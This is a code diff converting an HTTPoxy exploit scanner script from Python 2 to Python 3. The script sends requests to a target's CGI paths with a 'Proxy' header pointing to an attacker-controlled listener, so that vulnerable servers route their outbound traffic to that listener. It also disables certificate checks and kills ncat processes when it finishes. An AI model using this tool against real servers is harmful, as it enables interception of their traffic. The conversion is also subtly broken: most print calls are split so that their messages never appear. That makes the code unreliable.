@@ -13,13 +13,15 @@
 # DISCLAIMER: I take no responsibility for wrong doing or misuse of this exploit.
 #
 
-import urllib, urllib2, sys, getopt, requests, ssl, time, sys, subprocess, os
+import urllib, sys, getopt, requests, ssl, time, sys, subprocess, os
+import urllib.request as ur
 from array import *
 from subprocess import call
 
 ctx = ssl.create_default_context()
 ctx.check_hostname = False
 ctx.verify_mode = ssl.CERT_NONE
+
 
 class bcolors:
     HEADER = '\033[95m'
@@ -30,35 +32,41 @@ class bcolors:
     ENDC = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
-    
+
+
+def print_banner():
+    print(bcolors.OKBLUE + "         _____  _____  ___                __                 " + bcolors.ENDC)
+    print(bcolors.OKBLUE + "  /\\  /\\/__   \\/__   \\/ _ \\_____  ___   _/ _\\ ___ __ _ _ __  " + bcolors.ENDC)
+    print(bcolors.OKBLUE + " / /_/ /  / /\\/  / /\\/ /_)/ _ \\ \\/ / | | \\ \\ / __/ _` | '_ \\ " + bcolors.ENDC)
+    print(bcolors.OKBLUE + "/ __  /  / /    / / / ___/ (_) >  <| |_| |\\ \\ (_| (_| | | | | |" + bcolors.ENDC)
+    print(bcolors.OKBLUE + "\\/ /_/   \\/     \\/  \\/    \\___/_/\\_\\\\__, |\\__/\\___\\__,_|_| |_|" + bcolors.ENDC)
+    print(bcolors.OKBLUE + "                                    |___/                    " + bcolors.ENDC)
+
+
 def main(argv):
     argc = len(argv)
     if argc < 5:
-	print bcolors.OKBLUE + "         _____  _____  ___                __                 " + bcolors.ENDC
-	print bcolors.OKBLUE + "  /\  /\/__   \/__   \/ _ \_____  ___   _/ _\ ___ __ _ _ __  " + bcolors.ENDC
-	print bcolors.OKBLUE + " / /_/ /  / /\/  / /\/ /_)/ _ \ \/ / | | \ \ / __/ _` | '_ \ " + bcolors.ENDC
-	print bcolors.OKBLUE + "/ __  /  / /    / / / ___/ (_) >  <| |_| |\ \ (_| (_| | | | |" + bcolors.ENDC
-	print bcolors.OKBLUE + "\/ /_/   \/     \/  \/    \___/_/\_\\__, |\__/\___\__,_|_| |_|" + bcolors.ENDC
-	print bcolors.OKBLUE + "                                    |___/                    " + bcolors.ENDC
-	print bcolors.OKBLUE + "  HTTPoxy Exploit Scanner by 1N3 @ https://crowdshield.com" + bcolors.ENDC
-	print bcolors.WARNING + "[*] Usage: %s http://target.com cgi_list.txt listener_ip listener_port" % (argv[0]) + bcolors.ENDC
-	print ""
-	sys.exit(0)
+        print_banner()
+        print
+        bcolors.OKBLUE + "  HTTPoxy Exploit Scanner by 1N3 @ https://crowdshield.com" + bcolors.ENDC
+        print
+        bcolors.WARNING + "[*] Usage: %s http://target.com cgi_list.txt listener_ip listener_port" % (
+            argv[0]) + bcolors.ENDC
+        print
+        ""
+        sys.exit(0)
 
-    url = argv[1] # SET TARGET URL
-    wordlist = argv[2] # SET CGI WORDLIST
-    listen_ip = argv[3] # SET LISTENER IP
-    listen_port = argv[4] # SET LISTENER PORT
-    
-    print bcolors.OKBLUE + "         _____  _____  ___                __                 " + bcolors.ENDC
-    print bcolors.OKBLUE + "  /\  /\/__   \/__   \/ _ \_____  ___   _/ _\ ___ __ _ _ __  " + bcolors.ENDC
-    print bcolors.OKBLUE + " / /_/ /  / /\/  / /\/ /_)/ _ \ \/ / | | \ \ / __/ _` | '_ \ " + bcolors.ENDC
-    print bcolors.OKBLUE + "/ __  /  / /    / / / ___/ (_) >  <| |_| |\ \ (_| (_| | | | |" + bcolors.ENDC
-    print bcolors.OKBLUE + "\/ /_/   \/     \/  \/    \___/_/\_\\__, |\__/\___\__,_|_| |_|" + bcolors.ENDC
-    print bcolors.OKBLUE + "                                    |___/                    " + bcolors.ENDC
-    print bcolors.OKBLUE + " + -- --=[HTTPoxy Exploit Scanner by 1N3 @ https://crowdshield.com" + bcolors.ENDC
-    print ""
-    
+    url = argv[1]  # SET TARGET URL
+    wordlist = argv[2]  # SET CGI WORDLIST
+    listen_ip = argv[3]  # SET LISTENER IP
+    listen_port = argv[4]  # SET LISTENER PORT
+
+    print_banner()
+    print
+    bcolors.OKBLUE + " + -- --=[HTTPoxy Exploit Scanner by 1N3 @ https://crowdshield.com" + bcolors.ENDC
+    print
+    ""
+
     # READ IN CGI LIST ONE BY ONE AND APPEND TO URL
     num_lines = sum(1 for line in open(wordlist))
     f = open(wordlist)
@@ -67,33 +75,39 @@ def main(argv):
     f.close()
 
     # START PROXY LISTENER
-    print bcolors.WARNING + "[*] Scanning target: " + url
+    print
+    bcolors.WARNING + "[*] Scanning target: " + url
     cmd = 'bash listener.sh ' + listen_port
     os.system(cmd)
     time.sleep(3)
-    print bcolors.WARNING + "[*] Scanning target: " + url + "" + bcolors.ENDC
+    print
+    bcolors.WARNING + "[*] Scanning target: " + url + "" + bcolors.ENDC
     num = 0
-    while num < num_lines:  
-	# CONSTRUCT AND SEND REQUEST
-	cgi_req = str(lines[num])
-	req_url = url + cgi_req
-	sys.stdout.write("[+] Sending request: " + req_url)
-	req = urllib2.Request(req_url)
-	req.add_header('Proxy', listen_ip + ":" + listen_port)
-	req.add_header('User-Agent', 'HTTPoxyScan by 1N3')
-	try:
-		resp = urllib2.urlopen(req, context=ctx)
-		content = resp.read()
-	except Exception,e:
-		print "Exception: "+str(e)	
-	num += 1
-	
-    print bcolors.WARNING + "[*] Scan complete!" + bcolors.ENDC
+    while num < num_lines:
+        # CONSTRUCT AND SEND REQUEST
+        cgi_req = str(lines[num])
+        req_url = url + cgi_req
+        sys.stdout.write("[+] Sending request: " + req_url)
+        req = ur.Request(req_url)
+        req.add_header('Proxy', listen_ip + ":" + listen_port)
+        req.add_header('User-Agent', 'HTTPoxyScan by 1N3')
+        try:
+            resp = ur.urlopen(req, context=ctx)
+            content = resp.read()
+        except Exception as e:
+            print
+            "Exception: " + str(e)
+        num += 1
+
+    print
+    bcolors.WARNING + "[*] Scan complete!" + bcolors.ENDC
     # KILL OFF ANY RUNNING NETCAT PIDS
-    print bcolors.WARNING + "[*] Killing reverse listener..." + bcolors.ENDC
+    print
+    bcolors.WARNING + "[*] Killing reverse listener..." + bcolors.ENDC
     time.sleep(5)
     cmd = 'killall ncat'
     os.system(cmd)
     bcolors.WARNING + "[*] Done!" + bcolors.ENDC
-    
+
+
 main(sys.argv)
